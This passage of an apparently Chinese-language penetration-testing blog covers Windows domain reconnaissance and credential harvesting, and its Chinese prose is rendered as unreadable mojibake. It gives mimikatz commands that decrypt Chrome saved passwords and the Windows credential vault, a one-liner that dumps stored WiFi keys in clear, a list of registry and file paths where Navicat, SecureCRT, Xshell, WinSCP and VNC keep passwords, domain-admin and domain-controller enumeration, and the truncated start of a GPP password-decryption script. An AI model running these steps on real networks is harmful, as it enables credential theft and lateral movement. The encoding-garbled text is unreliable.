replicator(ç›®å½•å¤åˆ¶å™¨)</span><br><span class="line">(6)ftp publishing service (ftp )(ftp å‘è¡ŒæœåŠ¡)</span><br><span class="line">(7)lpdsvc</span><br><span class="line">(8)Net logon(ç½‘ç»œç™»å½•)</span><br><span class="line">(9)Network dde(ç½‘ç»œ dde)</span><br><span class="line">(10)Network dde dsdm(ç½‘ç»œ dde dsdm)</span><br><span class="line">(11)Network monitor agent(ç½‘ç»œç›‘æ§ä»£ç†)</span><br><span class="line">(12)ole(å¯¹è±¡é“¾æ¥ä¸åµŒå…¥)</span><br><span class="line">(13)remote access connection manager(è¿œç¨‹è®¿é—®è¿æ¥ç®¡ç†å™¨)</span><br><span class="line">(14)remote access isnsap service(è¿œç¨‹è®¿é—® isnsap æœåŠ¡)</span><br><span class="line">(15)remote access server(è¿œç¨‹è®¿é—®æœåŠ¡å™¨)</span><br><span class="line">(16)remote procedure call (rpc) locator(è¿œç¨‹è¿‡ç¨‹è°ƒç”¨å®šä½å™¨)</span><br><span class="line">(17)remote procedure call (rpc) service(è¿œç¨‹è¿‡ç¨‹è°ƒç”¨æœåŠ¡)</span><br><span class="line">(18)schedule(è°ƒåº¦)</span><br><span class="line">(19)server(æœåŠ¡å™¨)</span><br><span class="line">(20)simple tcp&#x2F;ip services(ç®€å• TCP&#x2F;IP æœåŠ¡)</span><br><span class="line">(21)snmp</span><br><span class="line">(22)spooler(åå°æ‰“å°ç¨‹åº)</span><br><span class="line">(23)tcp&#x2F;ip Netbios helper(TCP&#x2F;IP NETBIOS è¾…åŠ©å·¥å…·)</span><br><span class="line">(24)ups</span><br><span class="line">(25)workstation(å·¥ä½œç«™)</span><br><span class="line">(26)messenger(ä¿¡ä½¿)</span><br><span class="line">(27)dhcp client</span><br></pre></td></tr></table></figure><blockquote><p>TIME</p></blockquote><p>ä½œç”¨ï¼šä½¿è®¡ç®—æœºçš„æ—¶é’Ÿä¸å¦ä¸€å°è®¡ç®—æœºæˆ–åŸŸçš„æ—¶é—´åŒæ­¥ã€‚</p><p>å‘½ä»¤æ ¼å¼ï¼š<code>NET TIME [\\computername | /DOMAIN[:domainname] | /RTSDOMAIN[:domainname]] [/SET]</code></p><table><thead><tr><th>å‘½ä»¤</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>\\computername</code></td><td>è¦æ£€æŸ¥æˆ–åŒæ­¥çš„æœåŠ¡å™¨å</td></tr><tr><td><code>/domain[:domainname]</code></td><td>æŒ‡å®šè¦ä¸å…¶æ—¶é—´åŒæ­¥çš„åŸŸ</td></tr><tr><td><code>/set</code></td><td>ä½¿æœ¬è®¡ç®—æœºæ—¶é’Ÿä¸æŒ‡å®šè®¡ç®—æœºæˆ–åŸŸçš„æ—¶é’ŸåŒæ­¥ã€‚</td></tr><tr><td><code>/rtsdomain[:domainname]</code></td><td>RTåŸŸ</td></tr></tbody></table><blockquote><p>VIEW</p></blockquote><p>ä½œç”¨ï¼šæ˜¾ç¤ºåŸŸåˆ—è¡¨ã€è®¡ç®—æœºåˆ—è¡¨æˆ–æŒ‡å®šè®¡ç®—æœºçš„å…±äº«èµ„æºåˆ—è¡¨ã€‚</p><p>å‘½ä»¤æ ¼å¼ï¼š<code>NET VIEW [\\computername [/CACHE] | [/ALL] | /DOMAIN[:domainname]]</code></p><p>ä¸¾ä¾‹ï¼š</p><ul><li><code>net view \\GHS</code>æŸ¥çœ‹GHSè®¡ç®—æœºçš„å…±äº«èµ„æºåˆ—è¡¨ã€‚</li><li><code>net view /domain:ascotbe</code>æŸ¥çœ‹ascotbeåŸŸä¸­çš„æœºå™¨åˆ—è¡¨ã€‚</li></ul><table><thead><tr><th>å‘½ä»¤</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>\\computername</code></td><td>æŒ‡å®šè¦æŸ¥çœ‹å…¶å…±äº«èµ„æºçš„è®¡ç®—æœº</td></tr><tr><td><code>/CACHE</code></td><td>ç¼“å­˜ä¸­çš„</td></tr><tr><td><code>/ALL</code></td><td>æ‰€æœ‰çš„</td></tr><tr><td><code>/DOMAIN[:domainname</code></td><td>åŸŸä¸­çš„</td></tr></tbody></table><blockquote><p>USER</p></blockquote><p>ä½œç”¨ï¼šæ·»åŠ æˆ–æ›´æ”¹ç”¨æˆ·å¸å·æˆ–æ˜¾ç¤ºç”¨æˆ·å¸å·ä¿¡æ¯ã€‚</p><p>å‘½ä»¤æ ¼å¼ï¼š</p><ul><li><code>NET USER username [password | *] [options]] [/DOMAIN]</code></li><li><code>NET USER username &#123;password | *&#125; /ADD [options] [/DOMAIN]</code></li><li><code>NET USER username [/DELETE] [/DOMAIN]</code></li><li><code>NET USER username [/TIMES:&#123;times | ALL&#125;]</code></li><li><code>NET USER username [/ACTIVE: &#123;YES | NO&#125;]</code></li></ul><p>ä¸¾ä¾‹ï¼š<code>Net user ascotbe</code>æŸ¥çœ‹ç”¨æˆ·ascotbeçš„ä¿¡æ¯ã€‚</p><p>è¾“å…¥ä¸å¸¦å‚æ•°çš„å‘½ä»¤<code>Net user</code>æŸ¥çœ‹è®¡ç®—æœºä¸Šçš„ç”¨æˆ·å¸å·åˆ—è¡¨</p><table><thead><tr><th>å‘½ä»¤</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>username</code></td><td>æ·»åŠ ã€åˆ é™¤ã€æ›´æ”¹æˆ–æŸ¥çœ‹ç”¨æˆ·å¸å·å</td></tr><tr><td><code>password</code></td><td>ä¸ºç”¨æˆ·å¸å·åˆ†é…æˆ–æ›´æ”¹å¯†ç </td></tr><tr><td><code>/domain</code></td><td>åœ¨è®¡ç®—æœºä¸»åŸŸçš„ä¸»åŸŸæ§åˆ¶å™¨ä¸­æ‰§è¡Œæ“ä½œ</td></tr><tr><td><code>/DELETE</code></td><td>åˆ é™¤</td></tr><tr><td><code>/ADD</code></td><td>åœ¨åŸŸä¸­å¢åŠ è´¦å·</td></tr><tr><td><code>/ACTIVE</code></td><td>ï¼ˆè¿™ä¸ªæ²¡ç”¨è¿‡ï¼‰</td></tr><tr><td><code>/TIMES</code></td><td>ï¼ˆæ²¡ç”¨è¿‡ï¼‰</td></tr></tbody></table><blockquote><p>USE</p></blockquote><p>ä½œç”¨ï¼šè¿æ¥è®¡ç®—æœºæˆ–æ–­å¼€è®¡ç®—æœºä¸å…±äº«èµ„æºçš„è¿æ¥ï¼Œæˆ–æ˜¾ç¤ºè®¡ç®—æœºçš„è¿æ¥ä¿¡æ¯ã€‚</p><p>å‘½ä»¤æ ¼å¼ï¼š</p><ul><li><code>NET USE [devicename | *] [\\computername\sharename[\volume] [password | *]]</code></li><li><code>NET USE [/USER:[domainname\]username]</code></li><li><code>NET USE [/USER:[dotted domain name\]username]</code></li><li><code>NET USE [/USER:[username@dotted domain name]</code></li><li><code>NET USE [/SMARTCARD]</code></li><li><code>NET USE [/SAVECRED]</code></li><li><code>NET USE [/REQUIREINTEGRITY]</code></li><li><code>NET USE [/REQUIREPRIVACY]</code></li><li><code>NET USE [/WRITETHROUGH]</code></li><li><code>NET USE [[/DELETE] | [/PERSISTENT:&#123;YES | NO&#125;]]</code></li></ul><table><thead><tr><th>å‘½ä»¤</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>devicename</code></td><td>æŒ‡å®šè¦è¿æ¥åˆ°çš„èµ„æºåç§°æˆ–è¦æ–­å¼€çš„è®¾å¤‡åç§°</td></tr><tr><td><code>\\computername\sharename</code></td><td>æœåŠ¡å™¨åŠå…±äº«èµ„æºçš„åç§°</td></tr><tr><td><code>password</code></td><td>è®¿é—®å…±äº«èµ„æºçš„å¯†ç </td></tr><tr><td><code>*</code></td><td>æç¤ºé”®å…¥å¯†ç </td></tr><tr><td><code>/user</code></td><td>è¿æ¥çš„å¦å¤–ä¸€ä¸ªç”¨æˆ·</td></tr><tr><td><code>domainname</code></td><td>æŒ‡å®šå¦ä¸€ä¸ªåŸŸ</td></tr><tr><td><code>username</code></td><td>æŒ‡å®šç™»å½•çš„ç”¨æˆ·å</td></tr><tr><td><code>/home</code></td><td>å°†ç”¨æˆ·è¿æ¥åˆ°å…¶å®¿ä¸»ç›®å½•</td></tr><tr><td><code>/delete</code></td><td>å–æ¶ˆæŒ‡å®šç½‘ç»œè¿æ¥</td></tr><tr><td><code>/persistent</code></td><td>æ§åˆ¶æ°¸ä¹…ç½‘ç»œè¿æ¥çš„ä½¿ç”¨ã€‚</td></tr><tr><td><code>/SAVECRED</code></td><td>å·²ä¿å­˜</td></tr><tr><td><code>/REQUIREINTEGRITY</code></td><td>ï¼ˆä¸çŸ¥é“ï¼‰</td></tr><tr><td><code>/REQUIREPRIVACY</code></td><td>ï¼ˆä¸çŸ¥é“ï¼‰</td></tr><tr><td><code>/WRITETHROUGH</code></td><td>ï¼ˆä¸çŸ¥é“ï¼‰</td></tr><tr><td><code>/SMARTCARD</code></td><td>æ™ºèƒ½å¡</td></tr><tr><td><code>/volume</code></td><td>å·</td></tr></tbody></table><h4 id="æŸ¥çœ‹åŸŸç”¨æˆ·"><a href="#æŸ¥çœ‹åŸŸç”¨æˆ·" class="headerlink" title="æŸ¥çœ‹åŸŸç”¨æˆ·"></a>æŸ¥çœ‹åŸŸç”¨æˆ·</h4><p>æ™®é€šåŸŸç”¨æˆ·æƒé™å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/35.png" alt="image-20200730231555944"></p><h4 id="æŸ¥çœ‹åŸŸç®¡ç†å‘˜"><a href="#æŸ¥çœ‹åŸŸç®¡ç†å‘˜" class="headerlink" title="æŸ¥çœ‹åŸŸç®¡ç†å‘˜"></a>æŸ¥çœ‹åŸŸç®¡ç†å‘˜</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/36.png" alt="image-20200730231613687"></p><h4 id="å¿«é€Ÿå®šä½åŸŸæ§ip"><a href="#å¿«é€Ÿå®šä½åŸŸæ§ip" class="headerlink" title="å¿«é€Ÿå®šä½åŸŸæ§ip"></a>å¿«é€Ÿå®šä½åŸŸæ§ip</h4><p>æŸ¥åˆ°dimainåpingä¸‹è¿™ä¸ªä¸»æœºåå­—ï¼Œå°±èƒ½æ‰¾åˆ°IPåœ°å€äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br><span class="line">ping WIN-1OUEMJB0766</span><br><span class="line">nslookup -<span class="built_in">type</span>=all _ldap._tcp.dc._msdcs.domain.com</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/37.png" alt="image-20200730231819436"></p><h4 id="æŸ¥çœ‹åŸŸæ§åˆ¶å™¨"><a href="#æŸ¥çœ‹åŸŸæ§åˆ¶å™¨" class="headerlink" title="æŸ¥çœ‹åŸŸæ§åˆ¶å™¨"></a>æŸ¥çœ‹åŸŸæ§åˆ¶å™¨</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/38.png" alt="image-20200730231833721"></p><h3 id="å†…ç½‘ä¸»æœºå‘ç°"><a href="#å†…ç½‘ä¸»æœºå‘ç°" class="headerlink" title="å†…ç½‘ä¸»æœºå‘ç°"></a>å†…ç½‘ä¸»æœºå‘ç°</h3><h4 id="æŸ¥çœ‹å…±äº«èµ„æ–™"><a href="#æŸ¥çœ‹å…±äº«èµ„æ–™" class="headerlink" title="æŸ¥çœ‹å…±äº«èµ„æ–™"></a>æŸ¥çœ‹å…±äº«èµ„æ–™</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹arpè¡¨"><a href="#æŸ¥çœ‹arpè¡¨" class="headerlink" title="æŸ¥çœ‹arpè¡¨"></a>æŸ¥çœ‹arpè¡¨</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/39.png" alt="image-20200730231954183"></p><h4 id="æŸ¥çœ‹hostsæ–‡ä»¶"><a href="#æŸ¥çœ‹hostsæ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹hostsæ–‡ä»¶"></a>æŸ¥çœ‹hostsæ–‡ä»¶</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#linux</span></span><br><span class="line">cat  /etc/hosts</span><br><span class="line"><span class="comment">#windows</span></span><br><span class="line"><span class="built_in">type</span>  c:\Windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/40.png" alt="image-20200730232021228"></p><h4 id="æŸ¥çœ‹dnsç¼“å­˜"><a href="#æŸ¥çœ‹dnsç¼“å­˜" class="headerlink" title="æŸ¥çœ‹dnsç¼“å­˜"></a>æŸ¥çœ‹dnsç¼“å­˜</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig  /displaydns</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/41.png" alt="image-20200730232057694"></p><h3 id="ä¼šè¯æ”¶é›†"><a href="#ä¼šè¯æ”¶é›†" class="headerlink" title="ä¼šè¯æ”¶é›†"></a>ä¼šè¯æ”¶é›†</h3><p>åœ¨ç½‘å†…æ”¶é›†ä¼šè¯ï¼Œå¦‚çœ‹ç®¡ç†å‘˜ç™»å½•è¿‡å“ªäº›æœºå™¨ã€æœºå™¨è¢«è°ç™»å½•è¿‡ï¼Œè¿™æ ·æ”»å‡»çš„ç›®æ ‡å°±ä¼šæ¸…æ™°å¾ˆå¤šã€‚</p><p>apiç›¸å…³ä»‹ç»å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;lmshare&#x2F;nf-lmshare-netsessionenum</span><br></pre></td></tr></table></figure><h3 id="æ”¶é›†å‡­è¯"><a href="#æ”¶é›†å‡­è¯" class="headerlink" title="æ”¶é›†å‡­è¯"></a>æ”¶é›†å‡­è¯</h3><p>æ‹¿ä¸‹ä¸€å°æœºå™¨åï¼Œéœ€è¦å°½å¯èƒ½çš„æ”¶é›†ä¿¡æ¯ã€‚å¦‚ä¸‹æ˜¯å‡ ä¸ªå¸¸ç”¨è½¯ä»¶ä¿å­˜å¯†ç çš„æ³¨å†Œè¡¨åœ°å€ï¼Œå¯ä»¥æ ¹æ®ç®—æ³•å»è§£å¯†ä¿å­˜çš„è´¦å·å¯†ç ã€‚</p><table><thead><tr><th>æ•°æ®åº“åç§°</th><th>æ³¨å†Œè¡¨</th></tr></thead><tbody><tr><td>MySQL</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers&lt;your  connection name&gt;</td></tr><tr><td>MariaDB</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers&lt;your  connection name&gt;</td></tr><tr><td>MongoDB</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers&lt;your  connection name&gt;</td></tr><tr><td>Microsoft  SQL</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers&lt;your  connection name&gt;</td></tr><tr><td>Oracle</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers&lt;your  connection name&gt;</td></tr><tr><td>PostgreSQL</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers&lt;your  connection name&gt;</td></tr><tr><td>SQLite</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers&lt;your  connection name&gt;</td></tr></tbody></table><table><thead><tr><th>SecureCRT</th><th>æ³¨å†Œè¡¨</th></tr></thead><tbody><tr><td>xp/win2003</td><td>C:\Documents  and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</td></tr><tr><td>win7/win2008ä»¥ä¸Š</td><td>C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</td></tr></tbody></table><table><thead><tr><th>Xshell</th><th>æ³¨å†Œè¡¨</th></tr></thead><tbody><tr><td>Xshell 5</td><td>%userprofile%\Documents\NetSarang\Xshell\Sessions</td></tr><tr><td>Xshell 6</td><td>%userprofile%\Documents\NetSarang  Computer\6\Xshell\Sessions</td></tr></tbody></table><table><thead><tr><th>WinSCP</th><th>æ³¨å†Œè¡¨</th></tr></thead><tbody><tr><td>WinSCP</td><td>HKCU\Software\Martin  Prikryl\WinSCP 2\Sessions</td></tr></tbody></table><table><thead><tr><th>VNC</th><th>æ³¨å†Œè¡¨</th><th></th></tr></thead><tbody><tr><td>RealVNC</td><td>HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver</td><td>Password</td></tr><tr><td>TightVNC</td><td>HKEY_CURRENT_USER\Software\TightVNC\Server  Value</td><td>Password  or PasswordViewOnly</td></tr><tr><td>TigerVNC</td><td>HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4</td><td>Password</td></tr><tr><td>UltraVNC</td><td>C:\Program  Files\UltraVNC\ultravnc.ini</td><td>passwd or  passwd2</td></tr></tbody></table><h3 id="DPAP"><a href="#DPAP" class="headerlink" title="DPAP"></a>DPAP</h3><p>DPAPIï¼Œç”±å¾®è½¯ä»Windows 2000å¼€å§‹å‘å¸ƒï¼Œç§°ä¸ºData ProtectionApplication Programming Interfaceï¼ˆDPAPIï¼‰ã€‚å…¶åˆ†åˆ«æä¾›äº†åŠ å¯†å‡½æ•°CryptProtectData ä¸è§£å¯†å‡½æ•° CryptUnprotectData ã€‚</p><h4 id="è§£å¯†Chromeå¯†ç "><a href="#è§£å¯†Chromeå¯†ç " class="headerlink" title="è§£å¯†Chromeå¯†ç "></a>è§£å¯†Chromeå¯†ç </h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz  dpapi::chrome /<span class="keyword">in</span>:<span class="string">&quot;%localappdata%\Google\Chrome\User Data\Default\Login  Data&quot;</span> /unprotect</span><br></pre></td></tr></table></figure><h4 id="è§£å¯†Credential"><a href="#è§£å¯†Credential" class="headerlink" title="è§£å¯†Credential"></a>è§£å¯†Credential</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz  vault::cred /patch</span><br></pre></td></tr></table></figure><h3 id="åŸŸä¿¡ä»»"><a href="#åŸŸä¿¡ä»»" class="headerlink" title="åŸŸä¿¡ä»»"></a>åŸŸä¿¡ä»»</h3><p>ä¿¡ä»»å…³ç³»æ˜¯è¿æ¥åœ¨åŸŸä¸åŸŸä¹‹é—´çš„æ¡¥æ¢ã€‚å½“ä¸€ä¸ªåŸŸä¸å…¶ä»–åŸŸå»ºç«‹äº†ä¿¡ä»»å…³ç³»åï¼Œ2ä¸ªåŸŸä¹‹é—´ä¸ä½†å¯ä»¥æŒ‰éœ€è¦ç›¸äº’è¿›è¡Œç®¡ç†ï¼Œè¿˜å¯ä»¥è·¨ç½‘åˆ†é…æ–‡ä»¶å’Œæ‰“å°æœºç­‰è®¾å¤‡èµ„æºï¼Œä½¿ä¸åŒçš„åŸŸä¹‹é—´å®ç°ç½‘ç»œèµ„æºçš„å…±äº«ä¸ç®¡ç†ã€‚</p><h4 id="æŸ¥çœ‹åŸŸä¿¡ä»»"><a href="#æŸ¥çœ‹åŸŸä¿¡ä»»" class="headerlink" title="æŸ¥çœ‹åŸŸä¿¡ä»»"></a>æŸ¥çœ‹åŸŸä¿¡ä»»</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest  /domain_trusts</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/42.png" alt="image-20200730232120794"></p><h3 id="åŸŸä¼ é€"><a href="#åŸŸä¼ é€" class="headerlink" title="åŸŸä¼ é€"></a>åŸŸä¼ é€</h3><p>å½“å­˜åœ¨åŸŸä¼ é€æ¼æ´æ—¶ï¼Œå¯ä»¥è·å–åŸŸåè§£æè®°å½•ã€‚å½“æœ‰äº†è§£æè®°å½•åï¼Œä¹Ÿèƒ½æé«˜å¯¹ç½‘ç»œç¯å¢ƒçš„è¿›ä¸€æ­¥è®¤çŸ¥ï¼Œæ¯”å¦‚wwwè§£æçš„ipæ®µå¯èƒ½åœ¨dmzåŒºï¼Œmailè§£æçš„ipæ®µå¯èƒ½åœ¨æ ¸å¿ƒåŒºåŸŸç­‰ç­‰ã€‚</p><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nslookup  -<span class="built_in">type</span>=ns domain.com</span><br><span class="line">nslookup</span><br><span class="line">sserver  dns.domain.com</span><br><span class="line">ls  domain.com</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/43.png" alt="image-20200730232427143"></p><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig  @dns.domain.com axfr domain.com</span><br></pre></td></tr></table></figure><h3 id="DNSè®°å½•è·å–"><a href="#DNSè®°å½•è·å–" class="headerlink" title="DNSè®°å½•è·å–"></a>DNSè®°å½•è·å–</h3><p>åœ¨ç½‘å†…æ”¶é›†dnsè®°å½•ï¼Œå¯ä»¥å¿«é€Ÿå®šä½ä¸€äº›æœºå™¨ã€ç½‘ç«™ã€‚å¸¸ç”¨å·¥å…·æœ‰Dnscmdã€PowerViewã€‚</p><h4 id="Windows-Server"><a href="#Windows-Server" class="headerlink" title="Windows Server"></a>Windows Server</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dnscmd /ZonePrint ascotbe.com</span><br><span class="line">Dnscmd /EnumRecords ascotbe.com .</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/44.png" alt="image-20200730233830776"></p><h4 id="éWindows-Server"><a href="#éWindows-Server" class="headerlink" title="éWindows Server"></a>éWindows Server</h4><p>å¦‚æœæƒé™ä¸è¶³çš„è¯æ˜¯æ²¡åŠæ³•è¿è¡Œpsè„šæœ¬çš„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è„šæœ¬ä½ç½®https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</span></span><br><span class="line">import-module  PowerView.ps1</span><br><span class="line">Get-DNSRecord  -ZoneName ascotbe.com</span><br></pre></td></tr></table></figure><h3 id="WIFI"><a href="#WIFI" class="headerlink" title="WIFI"></a>WIFI</h3><p>é€šè¿‡å¦‚ä¸‹å‘½ä»¤è·å–è¿æ¥è¿‡çš„wifiå¯†ç ï¼Œåªèƒ½ç”¨CMDè¿è¡ŒPowershellä¼šæŠ¥é”™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f  <span class="string">&quot;skip=9 tokens=1,2 delims=:&quot;</span> %i <span class="keyword">in</span> (<span class="string">&#x27;netsh wlan show profiles&#x27;</span>)  <span class="keyword">do</span>  @<span class="built_in">echo</span> %j | findstr -i -v <span class="built_in">echo</span> |  netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/45.png" alt="image-20200730225857646"></p><h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>å½“åˆ†å‘ç»„ç­–ç•¥æ—¶ï¼Œä¼šåœ¨åŸŸçš„SYSVOLç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªgppé…ç½®çš„xmlæ–‡ä»¶ï¼Œå¦‚æœåœ¨é…ç½®ç»„ç­–ç•¥æ—¶å¡«å…¥äº†å¯†ç ï¼Œåˆ™å…¶ä¸­ä¼šå­˜åœ¨åŠ å¯†è¿‡çš„è´¦å·å¯†ç ã€‚è¿™äº›å¯†ç ï¼Œå¾€å¾€éƒ½æ˜¯ç®¡ç†å‘˜çš„å¯†ç ã€‚</p><p>å…¶ä¸­xmlä¸­çš„å¯†ç æ˜¯aesåŠ å¯†çš„ï¼Œå¯†é’¥å·²è¢«å¾®è½¯å…¬å¼€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-gppref&#x2F;2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom&#x3D;MSDN</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ç›¸å…³è„šæœ¬è¿›è¡Œè§£å¯†ï¼Œå¦‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span 